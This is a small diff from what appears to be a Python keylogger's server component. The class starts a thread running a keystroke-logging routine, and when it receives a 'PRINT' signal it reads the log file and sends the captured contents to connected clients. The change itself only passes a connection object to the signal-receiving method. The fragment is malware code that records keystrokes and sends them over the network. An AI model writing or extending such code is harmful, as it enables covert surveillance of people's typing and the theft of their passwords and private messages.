@@ -339,7 +339,7 @@ class Server:
         self.tklog = threading.Thread(target=Keylog.startKLog)
         self.tklog.start()
         while True:
-            s = self.receiveSignal()
+            s = self.receiveSignal(conn)
             if s == "PRINT":
                 data = self.read_log_file()
                 self.clients.send(data.encode())
